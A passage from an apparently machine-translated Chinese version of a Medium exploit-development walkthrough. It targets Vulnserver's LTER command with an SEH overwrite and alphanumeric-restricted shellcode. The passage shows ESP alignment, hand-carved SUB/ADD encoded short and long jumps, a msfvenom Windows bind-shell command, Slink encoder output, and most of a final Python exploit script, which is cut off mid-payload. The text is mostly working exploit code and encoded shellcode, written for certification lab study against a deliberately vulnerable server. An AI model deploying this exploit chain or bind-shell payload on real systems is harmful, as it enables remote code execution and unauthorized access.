im bi translated">一旦我们跳过外壳代码，我们可以看到短JMP ( <code class="fe lx ly lz ma b">\xEB\x80</code>)现在在我们的执行路径中被成功解码。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/8415b84b2b8574bc037b752647d4af5e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/format:webp/1*1pv4QLt1j34a67d4Il9-2Q.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">解码短JMP</figcaption></figure><p id="82d2" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">一旦我们通过短JMP，我们将成功地获得大约67字节的缓冲区。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/4ba1d53b82ccd75d0facf20a3baba130.png" data-original-src="https://miro.medium.com/v2/resize:fit:1184/format:webp/1*C0K5Xp2Hruyy8uWdO8-5pw.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">在第二阶段编码短JMP之后</figcaption></figure><ul class=""><li id="7af2" class="mn mo it lb b lc nb lg nc lk ni lo nj ls nk lw ms mt mu mv bi translated">更新了第二阶段外壳代码PoC脚本:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/2nd-stage_lter.py" rel="noopener ugc nofollow" target="_blank">第二阶段_lter.py </a></li></ul></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="3cbb" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">#3阶段外壳代码—长JMP</h2><p id="c17f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">不幸的是，我们仍然没有足够的空间来放置我们的有效载荷，比如bind shell。有了这个新获得的67字节缓冲区，我们这次将引入一个长JMP来规避空间限制。步骤将非常类似于<strong class="lb iu"> #第二阶段外壳代码(短JMP) </strong>。</p><p id="05e6" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">首先，让我们再次对齐<code class="fe lx ly lz ma b">ESP</code>以将<code class="fe lx ly lz ma b">ESP</code>指向缓冲区的底部，我们解码后的长JMP将放在那里。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="c028" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### ESP Alignment (Long JMP)</strong></span><span id="418e" class="nz kc it ma b gy ox ob l oc od">\x54             # PUSH ESP <br/>\x58             # POP EAX<br/>\x2C\x38         # ADD AL,0x38 <em class="ng">(0187FFF9 — 0187FFC1 = 0x39)</em><br/>\x50             # PUSH EAX<br/>\x5C             # POP ESP</span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/e0c3672a2ae4bbd886bf5a5c975e6de4.png" data-original-src="https://miro.medium.com/v2/resize:fit:702/format:webp/1*gIoBFl7mO0UPhh0ktXd2qA.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">电潜泵校准—长JMP</figcaption></figure><p id="a9bc" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">接下来，我们要放置我们的长JMP外壳代码。由于我们在当前位置上方有大约3000+的空白空间，所以我们想将指针重定向到“A”s的最开始。我们将使用<code class="fe lx ly lz ma b">PUSH ESP</code> → <code class="fe lx ly lz ma b">POP EBX</code> → <code class="fe lx ly lz ma b">subtract necessary bytes</code> → <code class="fe lx ly lz ma b">CALL EBX</code>。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="7547" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### Long JMP (Shellcode)</strong></span><span id="edb9" class="nz kc it ma b gy ox ob l oc od">\x54                      # PUSH ESP<br/>\x5B                      # POP EBX<br/>\x81\xEB\xB9\x0D\x00\x00  # SUB EBX, 0xDB9 <br/>                          # (0187FFC1 - 0187F208 = 0xDB9)<br/>\xFF\xD3                  # CALL EBX</span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/6674a58249ddeb1ea6bb2a11ac7d6bf1.png" data-original-src="https://miro.medium.com/v2/resize:fit:790/format:webp/1*rFSEQ-tGE8qR2eBpAQMMyg.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">长JMP外壳代码</figcaption></figure><p id="3b26" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">正如我们所看到的，前两个字节<code class="fe lx ly lz ma b">\x54\x5B</code>是允许的字符，但是其余的需要被编码。这次我们将使用SUB/ADD编码技术来绕过受限字符集。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="f628" class="nz kc it ma b gy oa ob l oc od">1) Value to Encode<br/>   \x81\xEB\xB9\x0D <em class="ng">-(big-endian)-&gt;</em> 0DB9EB81<br/>   \x00\x00\xFF\xD3 <em class="ng">-(big-endian)-&gt;</em> d3ff0000</span><span id="5102" class="nz kc it ma b gy ox ob l oc od">2) SUB Encoding (d3ff0000)<br/>   0 - d3ff0000 = 0xFFFFFFFF- d3ff0000 + 1 = 2C010000<br/>   0x12C010000<br/>   sub eax, 7F7F7F7F = AC818081<br/>   sub eax, 7F7F7F7F = 2D020102<br/>   sub eax, 2D020102 = 00000000<br/>   push eax</span><span id="13d9" class="nz kc it ma b gy ox ob l oc od">3) ADD Encoding (0DB9EB81)<br/>   add eax, 07657641 = 07657641<br/>   add eax, 06547540 = 0db9eb81<br/>   push eax</span><span id="d454" class="nz kc it ma b gy ox ob l oc od"><strong class="ma iu">### Encoded Long JMP </strong></span><span id="3fec" class="nz kc it ma b gy ox ob l oc od">\x54                      # PUSH ESP<br/>\x5B                      # POP EBX<br/>\x25\x4A\x4D\x4E\x55      # Zero out EAX<br/>\x25\x35\x32\x31\x2A      #<br/>\x2D\x7F\x7F\x7F\x7F      # Carving \x00\x00\xFF\xD3<br/>\x2D\x7F\x7F\x7F\x7F      #<br/>\x2D\x02\x01\x02\x2D      #<br/>\x50                      # PUSH EAX<br/>\x25\x4A\x4D\x4E\x55      # Zero out EAX<br/>\x25\x35\x32\x31\x2A      # <br/>\x05\x41\x76\x65\x07      # Carving \x81\xEB\xB9\x0D<br/>\x05\x40\x75\x54\x06      #<br/>\x50                      # PUSH EAX</span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pj"><img src="../Images/012e45f59535f0b31c98342bb3a46c3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:828/format:webp/1*mCfErJa0k39mLI68cpembA.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">编码长JMP</figcaption></figure><p id="ea95" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">一旦我们通过编码的外壳代码，长JMP将很快恢复到原来的状态。</p><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/93f3d3a453459101ccd43db2571a9c40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*0SN5qRXVebLCPeePF9Knpg.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">解码长JMP</figcaption></figure><p id="4c0d" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">一旦我们穿过漫长的JMP，我们将真正到达“A”s的起点，在那里我们将有大约3000+的空间来放置我们的下一个有效载荷。</p><ul class=""><li id="ce81" class="mn mo it lb b lc nb lg nc lk ni lo nj ls nk lw ms mt mu mv bi translated">更新了第三阶段外壳代码PoC脚本:<a class="ae nh" href="https://github.com/bigb0sss/OSCE/blob/master/vulnserver/LTER%20-%20SEH%20Overwrite/3rd-stage_lter.py" rel="noopener ugc nofollow" target="_blank">第三阶段_lter.py </a></li></ul></div><div class="ab cl mb mc hx md" role="separator"><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg mh"/><span class="me bw bk mf mg"/></div><div class="im in io ip iq"><h2 id="1402" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">#4阶段外壳代码—绑定外壳</h2><p id="73e7" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">我们正处于获得绑定外壳的最后一步！在我们将msfvenom绑定到shell之前，我们再次需要将我们的<code class="fe lx ly lz ma b">ESP</code>指向“A”的底部。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="3bf7" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### ESP Alignment (Bind Shell)</strong></span><span id="f9b9" class="nz kc it ma b gy ox ob l oc od">\x54             # PUSH ESP <br/>\x58             # POP EAX<br/>\x2C\x3D         # ADD AL,0x3D <em class="ng">(0180FFB5 — 0180ff78 = 0x39)</em><br/>\x50             # PUSH EAX<br/>\x5C             # POP ESP</span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/7a2e5cad92ace0fd31429b048a551db6.png" data-original-src="https://miro.medium.com/v2/resize:fit:686/format:webp/1*e168OQfAehQuiytASIXVxQ.png"/></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">ESP校准</figcaption></figure><p id="89df" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">让我们生成一个<code class="fe lx ly lz ma b">msfvenom</code>绑定外壳。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="dd46" class="nz kc it ma b gy oa ob l oc od">msfvenom -p windows/shell_bind_tcp LHOST=127.0.0.1 LPORT=443 BUFFERREGISTER=esp EXITFUNC=thread -f c -b "\x00"</span><span id="4262" class="nz kc it ma b gy ox ob l oc od"><em class="ng">* BUFFERREGISTER: If we specify this flag, it will directly points our payload to the specified register</em></span></pre><figure class="nm nn no np gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pm"><img src="../Images/2fea3debcb98887fe3300ff46ed76f34.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EikhKFrubc9_ODFT_UwMLQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">MSF毒液结合壳</figcaption></figure><p id="d9b6" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">我们的下一步将是编码由<code class="fe lx ly lz ma b">msfvenom</code>生成的外壳代码。我们肯定可以手动完成这项工作；然而，我们将使用一个由@ihack4falafel创建的名为<a class="ae nh" href="https://github.com/ihack4falafel/Slink" rel="noopener ugc nofollow" target="_blank"> Slink </a>的出色编码器。</p><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="1adf" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### Encoding with Slink</strong></span><span id="c66b" class="nz kc it ma b gy ox ob l oc od">root@kali:/opt/Slink# python Slink.py <br/>Enter your shellcode: \x89\xe7\xba\x16\xa7\xf4\x0b\x2b\xc9\xb1\x53\x83\xc7\x04\x31\x57\x0e\x03\x41\xa9\x16\xfe\x91\x5d\x54\x01\x69\x9e\x39\x8b\x8c\xaf\x79\xef\xc5\x80\x49\x7b\x8b\x2c\x21\x29\x3f\xa6\x47\xe6\x30\x0f\xed\xd0\x7f\x90\x5e\x20\x1e\x12\x9d\x75\xc0\x2b\x6e\x88\x01\x6b\x93\x61\x53\x24\xdf\xd4\x43\x41\x95\xe4\xe8\x19\x3b\x6d\x0d\xe9\x3a\x5c\x80\x61\x65\x7e\x23\xa5\x1d\x37\x3b\xaa\x18\x81\xb0\x18\xd6\x10\x10\x51\x17\xbe\x5d\x5d\xea\xbe\x9a\x5a\x15\xb5\xd2\x98\xa8\xce\x21\xe2\x76\x5a\xb1\x44\xfc\xfc\x1d\x74\xd1\x9b\xd6\x7a\x9e\xe8\xb0\x9e\x21\x3c\xcb\x9b\xaa\xc3\x1b\x2a\xe8\xe7\xbf\x76\xaa\x86\xe6\xd2\x1d\xb6\xf8\xbc\xc2\x12\x73\x50\x16\x2f\xde\x3d\xdb\x02\xe0\xbd\x73\x14\x93\x8f\xdc\x8e\x3b\xbc\x95\x08\xbc\xc3\x8f\xed\x52\x3a\x30\x0e\x7b\xf9\x64\x5e\x13\x28\x05\x35\xe3\xd5\xd0\xa0\xeb\x70\x8b\xd6\x16\xc2\x7b\x57\xb8\xab\x91\x58\xe7\xcc\x99\xb2\x80\x65\x64\x3d\xaf\xce\xe1\xdb\xc5\x20\xa4\x74\x71\x83\x93\x4c\xe6\xfc\xf1\xe4\x80\xb5\x13\x32\xaf\x45\x36\x14\x27\xce\x55\xa0\x56\xd1\x73\x80\x0f\x46\x09\x41\x62\xf6\x0e\x48\x14\x9b\x9d\x17\xe4\xd2\xbd\x8f\xb3\xb3\x70\xc6\x51\x2e\x2a\x70\x47\xb3\xaa\xbb\xc3\x68\x0f\x45\xca\xfd\x2b\x61\xdc\x3b\xb3\x2d\x88\x93\xe2\xfb\x66\x52\x5d\x4a\xd0\x0c\x32\x04\xb4\xc9\x78\x97\xc2\xd5\x54\x61\x2a\x67\x01\x34\x55\x48\xc5\xb0\x2e\xb4\x75\x3e\xe5\x7c\x95\xdd\x2f\x89\x3e\x78\xba\x30\x23\x7b\x11\x76\x5a\xf8\x93\x07\x99\xe0\xd6\x02\xe5\xa6\x0b\x7f\x76\x43\x2b\x2c\x77\x46<br/>Enter shellcode variable name: stage4<br/>[!] Shellcode size is not divisible by 4<br/>[+] Padding shellcode with 2 NOPS..<br/>[*] Encoding [90904677]..<br/>[+] No bad character found, using default encoder..<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x23\x50\x50" ## add  eax, 0x50502333<br/>stage4 += "\x05\x44\x23\x40\x40" ## add  eax, 0x40402344<br/>stage4 += "\x50"                 ## push eax<br/>[*] Encoding [2c2b4376]..<br/>[+] No bad character found, using default encoder..<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x22\x16\x16" ## add  eax, 0x16162233<br/>stage4 += "\x05\x43\x21\x15\x16" ## add  eax, 0x16152143<br/>stage4 += "\x50"                 ## push eax<br/>...snip...</span></pre><p id="c401" class="pw-post-body-paragraph kz la it lb b lc nb le lf lg nc li lj lk nd lm ln lo ne lq lr ls nf lu lv lw im bi translated">一旦Slink完成了bind shell的编码，就将有效负载放在我们的<code class="fe lx ly lz ma b">ESP</code>对齐shell代码旁边。</p><h2 id="66de" class="nz kc it bd kd of og dn kh oh oi dp kl lk oj ok kp lo ol om kt ls on oo kx op bi translated">最终利用</h2><pre class="nm nn no np gt nv ma nw nx aw ny bi"><span id="95e8" class="nz kc it ma b gy oa ob l oc od"><strong class="ma iu">### </strong><a class="ae nh" href="https://github.com/bigb0sss/OSCE/edit/master/vulnserver/LTER%20-%20SEH%20Overwrite/final_lter.py" rel="noopener ugc nofollow" target="_blank"><strong class="ma iu">Final_lter.py</strong></a><strong class="ma iu"> (Source by bigb0ss)</strong></span><span id="c64a" class="nz kc it ma b gy ox ob l oc od">import socket<br/>import struct<br/>import os<br/>import sys</span><span id="006a" class="nz kc it ma b gy ox ob l oc od">vuln_command = "LTER _.?"<br/>crash = 4000<br/>offset = 3520<br/>seh = struct.pack("&lt;I", 0x6250120b)        # POP POP RET</span><span id="cc9e" class="nz kc it ma b gy ox ob l oc od"><strong class="ma iu"># 1st Stage Shellcode (Short JMP - nSEH)</strong><br/>stage1 = ""<br/>stage1 += "\x75\x08"                       # JNZ SHORT [+0x10] = Jump if ZF is not 0<br/>stage1 += "\x74\x06"                       # JZ SHORT [+0x8] = Jump if ZF is 0</span><span id="65ec" class="nz kc it ma b gy ox ob l oc od"><strong class="ma iu"># 2nd Stage Shellcode (Short JMP - Encoded \xEB\x80)</strong><br/>stage2 = ""<br/>stage2 += "\x54"                           # PUSH ESP <br/>stage2 += "\x58"                           # POP EAX<br/>stage2 += "\x66\x05\x59\x13"               # ADD AX,0x1359 <br/>stage2 += "\x50"                           # PUSH EAX<br/>stage2 += "\x5C"                           # POP ESP<br/>stage2 += "\x25\x4A\x4D\x4E\x55"           # Zero out EAX<br/>stage2 += "\x25\x35\x32\x31\x2A"           # <br/>stage2 += "\x2D\x7F\x7F\x7F\x7F"           # Carving \xEB\x80<br/>stage2 += "\x2D\x7F\x7F\x7F\x7F"           # \x90\x90<br/>stage2 += "\x2D\x02\x50\x50\x50"           # <br/>stage2 += "\x2D\x15\x30\x20\x20"           # <br/>stage2 += "\x50"                           # PUSH EAX</span><span id="907e" class="nz kc it ma b gy ox ob l oc od"><strong class="ma iu"># 3rd Stage Shellcode (Long JMP)</strong><br/>stage3 = ""<br/>stage3 += "\x54"                           # PUSH ESP <br/>stage3 += "\x58"                           # POP EAX<br/>stage3 += "\x2C\x38"                       # ADD AL,0x38 <br/>stage3 += "\x50"                           # PUSH EAX<br/>stage3 += "\x5C"                           # POP ESP<br/>stage3 += "\x54"                           # PUSH ESP<br/>stage3 += "\x5B"                           # POP EBX<br/>stage3 += "\x25\x4A\x4D\x4E\x55"           # Zero out EAX<br/>stage3 += "\x25\x35\x32\x31\x2A"           #<br/>stage3 += "\x2D\x7F\x7F\x7F\x7F"           # Carving \x00\x00<br/>stage3 += "\x2D\x7F\x7F\x7F\x7F"           # \xFF\xD3<br/>stage3 += "\x2D\x02\x01\x02\x2D"           #<br/>stage3 += "\x50"                           # PUSH EAX<br/>stage3 += "\x25\x4A\x4D\x4E\x55"           # Zero out EAX<br/>stage3 += "\x25\x35\x32\x31\x2A"           # <br/>stage3 += "\x05\x41\x76\x65\x07"           # Carving \x81\xEB<br/>stage3 += "\x05\x40\x75\x54\x06"           # \xB9\x0D<br/>stage3 += "\x50"                           # PUSH EAX</span><span id="4a36" class="nz kc it ma b gy ox ob l oc od"><strong class="ma iu"># 4th Stage Shellcode (Bind Shell)</strong><br/># msfvenom -p windows/shell_bind_tcp LHOST=127.0.0.1 LPORT=443 BUFFERREGISTER=esp EXITFUNC=thread -f c -b "\x00"</span><span id="2ab2" class="nz kc it ma b gy ox ob l oc od">stage4 = ""<br/>stage4 += "\x54"                           # PUSH ESP <br/>stage4 += "\x58"                           # POP EAX<br/>stage4 += "\x2C\x3D"                       # ADD AL,0x38 <br/>stage4 += "\x50"                           # PUSH EAX<br/>stage4 += "\x5C"                           # POP ESP<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x23\x50\x50" ## add  eax, 0x50502333<br/>stage4 += "\x05\x44\x23\x40\x40" ## add  eax, 0x40402344<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x22\x16\x16" ## add  eax, 0x16162233<br/>stage4 += "\x05\x43\x21\x15\x16" ## add  eax, 0x16152143<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x63\x53\x16\x47" ## add  eax, 0x47165363<br/>stage4 += "\x05\x53\x43\x15\x36" ## add  eax, 0x36154353<br/>stage4 += "\x05\x62\x43\x13\x35" ## add  eax, 0x35134362<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x55\x70\x73\x01" ## add  eax, 0x01737055<br/>stage4 += "\x05\x44\x70\x63\x01" ## add  eax, 0x01637044<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x35\x74\x42\x14" ## add  eax, 0x14427435<br/>stage4 += "\x05\x34\x64\x42\x13" ## add  eax, 0x13426434<br/>stage4 += "\x05\x24\x53\x42\x13" ## add  eax, 0x13425324<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x22\x46\x11\x43" ## add  eax, 0x43114622<br/>stage4 += "\x05\x12\x35\x22\x33" ## add  eax, 0x33223512<br/>stage4 += "\x05\x22\x33\x11\x33" ## add  eax, 0x33113322<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x27\x34\x65\x20" ## add  eax, 0x20653427<br/>stage4 += "\x05\x17\x44\x55\x10" ## add  eax, 0x10554417<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x43\x66\x27\x44" ## add  eax, 0x44276643<br/>stage4 += "\x05\x43\x66\x16\x44" ## add  eax, 0x44166643<br/>stage4 += "\x05\x42\x44\x25\x34" ## add  eax, 0x34254442<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x33\x27\x73\x36" ## add  eax, 0x36732733<br/>stage4 += "\x05\x42\x17\x72\x46" ## add  eax, 0x46721742<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x63\x60\x17\x62" ## add  eax, 0x62176063<br/>stage4 += "\x05\x62\x50\x17\x52" ## add  eax, 0x52175062<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x11\x23\x33\x34" ## add  eax, 0x34332311<br/>stage4 += "\x05\x12\x22\x33\x24" ## add  eax, 0x24332212<br/>stage4 += "\x05\x11\x22\x22\x23" ## add  eax, 0x23222211<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x32\x31\x15\x33" ## add  eax, 0x33153132<br/>stage4 += "\x05\x22\x30\x15\x34" ## add  eax, 0x34153022<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x34\x53\x61\x73" ## add  eax, 0x73615334<br/>stage4 += "\x05\x44\x44\x61\x62" ## add  eax, 0x62614444<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x21\x02\x62\x65" ## add  eax, 0x65620221<br/>stage4 += "\x05\x11\x02\x52\x64" ## add  eax, 0x64520211<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x37\x25\x70\x06" ## add  eax, 0x06702537<br/>stage4 += "\x05\x26\x25\x60\x06" ## add  eax, 0x06602526<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x62\x76\x33\x32" ## add  eax, 0x32337662<br/>stage4 += "\x05\x51\x65\x33\x31" ## add  eax, 0x31336551<br/>stage4 += "\x05\x62\x53\x33\x22" ## add  eax, 0x22335362<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x62\x17\x44\x52" ## add  eax, 0x52441762<br/>stage4 += "\x05\x51\x16\x44\x41" ## add  eax, 0x41441651<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x16\x31\x76\x26" ## add  eax, 0x26763116<br/>stage4 += "\x05\x15\x30\x66\x15" ## add  eax, 0x15663015<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x17\x33\x65\x76" ## add  eax, 0x76653317<br/>stage4 += "\x05\x16\x23\x54\x66" ## add  eax, 0x66542316<br/>stage4 += "\x05\x15\x22\x44\x54" ## add  eax, 0x54442215<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x55\x66\x62\x34" ## add  eax, 0x34626655<br/>stage4 += "\x05\x55\x55\x61\x34" ## add  eax, 0x34615555<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x15\x30\x23\x62" ## add  eax, 0x62233015<br/>stage4 += "\x05\x15\x40\x24\x51" ## add  eax, 0x51244015<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x30\x63\x31\x17" ## add  eax, 0x17316330<br/>stage4 += "\x05\x40\x63\x20\x17" ## add  eax, 0x17206340<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x66\x47\x62\x62" ## add  eax, 0x62624766<br/>stage4 += "\x05\x56\x46\x52\x52" ## add  eax, 0x52524656<br/>stage4 += "\x05\x34\x35\x32\x32" ## add  eax, 0x32323534<br/>stage4 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x57\x13\x72\x71" ## add  eax, 0x71721357<br/>stage4 += "\x05\x46\x04\x72\x61" ## add  eax, 0x61720446<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += "\x05\x07\x24\x12\x56" ## add  eax, 0x56122407<br/>stage4 += "\x05\x07\x24\x02\x45" ## add  eax, 0x45022407<br/>stage4 += "\x50"                 ## push eax<br/>stage4 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a<br/>stage4 += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235<br/>stage4 += 